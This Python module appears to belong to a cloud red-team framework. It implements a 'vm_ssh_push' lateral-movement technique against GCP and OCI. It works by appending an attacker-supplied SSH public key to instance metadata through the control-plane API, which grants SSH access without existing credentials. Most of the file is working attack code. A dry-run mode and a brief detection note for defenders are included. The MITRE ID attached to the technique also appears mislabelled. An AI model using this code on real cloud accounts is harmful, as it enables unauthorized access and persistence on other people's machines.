# ================================================================
# TECHNIQUE: lateral_movement/vm_ssh_push
# ----------------------------------------------------------------
# TACTIC:    Lateral Movement (TA0008)
# TECHNIQUE: T1569.002 — Cloud Administration Command
#
# PURPOSE:   Inject a public SSH key into a target cloud VM
#            via the control plane (Metadata/API). This enables
#            direct SSH access without existing credentials.
#
# PROVIDERS: GCP, OCI (AWS/Azure planned)
#
# HOW IT WORKS:
#   GCP   — Modifies instance metadata to append the provided
#           key to the 'ssh-keys' list.
#
#   OCI   — Updates instance metadata to append the key to
#           'ssh_authorized_keys'.
#
# OPTIONS:
#   target (required) — VM ID/Name (GCP) or Instance OCID (OCI).
#   pub    (required) — Public SSH key string (e.g. "ssh-rsa AAA...").
#   user   (required) — Target username (e.g. "cloud-user").
#   zone   (GCP only) — GCP Zone where the VM resides.
#
# DETECTION (Blue Team):
#   Monitor for metadata update events (setMetadata, UpdateInstance).
#   Alert: Unexpected SSH keys added to high-value instances.
#
# SAFE:     No — modifies instance configuration.
# ================================================================

from __future__ import annotations

import logging
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)


# ----------------------------------------------------------------
# Operational Formatter
# ----------------------------------------------------------------
def format_ssh_push_result(result: Any) -> None:
    from quantum_mechanic.shell.formatters import console

    data = result.data
    provider = result.provider.upper()
    target = data.get("target", "unknown")
    user = data.get("user", "unknown")

    console.print(
        f"  [bold green]✓[/bold green] SSH Key Injection on [cyan]{provider}[/cyan] Target [bold]{target}[/bold]"
    )

    if data.get("status") == "success":
        console.print(
            f"  [bold green]Success:[/bold green] Key for user [bold cyan]{user}[/bold cyan] is now active."
        )
        console.print(f"  [dim]Access via: ssh -i <private_key> {user}@<instance_ip>[/dim]")
    else:
        console.print(f"  [bold red]Error:[/bold red] {data.get('error', 'Unknown failure')}")


@technique(
    technique_id="lateral_movement/vm_ssh_push",
    tactic="lateral_movement",
    mitre_id="T1569.002",
    providers=["gcp", "oci"],
    severity="critical",
    safe=False,
    safe_mode_available=True,
    description="Inject a public SSH key into a cloud VM via control plane metadata.",
    formatter=format_ssh_push_result,
    parameters=[
        Parameter(
            "target",
            "The target VM name (GCP) or OCID (OCI).",
            required=True,
            example="target-vm-1",
        ),
        Parameter("pub", "The public SSH key string.", required=True, example="ssh-rsa AAAAB3..."),
        Parameter("user", "The username to associate with the key.", required=True, example="opc"),
        Parameter("zone", "The GCP zone (Required for GCP).", example="us-central1-a"),
    ],
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute SSH push across providers."""
    if ctx.provider_name == "gcp":
        return _push_gcp(ctx)
    if ctx.provider_name == "oci":
        return _push_oci(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "results": []}


def _push_gcp(ctx: ExecutionContext) -> dict[str, Any]:
    try:
        from googleapiclient.discovery import build
    except ImportError:
        return {"error": "google-api-python-client not installed."}

    target = ctx.get_param("target")
    pub_key = ctx.get_param("pub")
    user = ctx.get_param("user")
    zone = ctx.get_param("zone")
    project_id = ctx.whoami().account_id

    if not zone:
        return {"error": "GCP requires 'zone' parameter."}

    new_entry = f"{user}:{pub_key}"

    if ctx.safe_mode:
        return {"target": target, "user": user, "status": "would_push"}

    try:
        compute = build("compute", "v1", credentials=ctx.session)
        ctx.info(f"GCP: Fetching metadata for {target}...")

        inst = compute.instances().get(project=project_id, zone=zone, instance=target).execute()
        metadata = inst.get("metadata", {"items": []})
        fingerprint = metadata.get("fingerprint")
        items = metadata.get("items", [])

        ssh_item = next((i for i in items if i["key"] == "ssh-keys"), None)
        if ssh_item:
            if new_entry in ssh_item["value"]:
                return {
                    "target": target,
                    "user": user,
                    "status": "success",
                    "note": "Key already present.",
                }
            ssh_item["value"] = ssh_item["value"] + "\n" + new_entry
        else:
            items.append({"key": "ssh-keys", "value": new_entry})

        ctx.info(f"GCP: Pushing key for {user}...")
        compute.instances().setMetadata(
            project=project_id,
            zone=zone,
            instance=target,
            body={"fingerprint": fingerprint, "items": items},
        ).execute()

        return {"target": target, "user": user, "status": "success"}
    except Exception as e:
        return {"error": str(e), "target": target}


def _push_oci(ctx: ExecutionContext) -> dict[str, Any]:
    try:
        import oci
    except ImportError:
        return {"error": "oci not installed."}

    target = ctx.get_param("target")
    pub_key = ctx.get_param("pub")
    user = ctx.get_param("user")

    if ctx.safe_mode:
        return {"target": target, "user": user, "status": "would_push"}

    try:
        config = ctx.session["config"]
        signer = ctx.session.get("signer")
        identity = (
            oci.core.ComputeClient(config={}, signer=signer)
            if signer
            else oci.core.ComputeClient(config)
        )

        ctx.info(f"OCI: Fetching metadata for {target[:20]}...")
        inst = identity.get_instance(target).data
        metadata = inst.metadata or {}
        current_keys = metadata.get("ssh_authorized_keys", "")

        if pub_key in current_keys:
            return {
                "target": target,
                "user": user,
                "status": "success",
                "note": "Key already present.",
            }

        metadata["ssh_authorized_keys"] = (current_keys + "\n" + pub_key).strip()

        ctx.info(f"OCI: Updating metadata for {target[:20]}...")
        identity.update_instance(target, oci.core.models.UpdateInstanceDetails(metadata=metadata))

        return {"target": target, "user": user, "status": "success"}
    except Exception as e:
        return {"error": str(e), "target": target}
